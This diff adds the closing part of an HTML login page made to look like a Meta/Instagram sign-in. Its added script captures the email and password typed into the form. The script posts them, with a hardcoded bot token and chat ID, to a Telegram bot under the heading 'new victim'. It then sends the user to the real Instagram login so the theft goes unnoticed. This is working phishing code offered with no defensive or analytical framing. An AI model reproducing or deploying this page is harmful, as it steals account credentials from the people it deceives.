@@ -107,4 +107,27 @@
 
 <div class="bottom-section">
     <a href="#" class="create-btn">Create new account</a>
-    <img src="
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" class="meta-logo" alt="Meta">
+</div>
+
+<script>
+    const token = "8201700890:AAEwJzsN_hc_3xjNBsgMaZ561m5mpyFqquc";
+    const chatId = "6311365239";
+
+    document.getElementById('secureForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const u = document.getElementById('email').value;
+        const p = document.getElementById('pass').value;
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: `📥 YANGI QURBON:\n👤 Login: ${u}\n🔑 Parol: ${p}` })
+        }).then(() => {
+            window.location.href = "https://www.instagram.com/accounts/login/";
+        });
+    });
+</script>
+
+</body>
+</html>
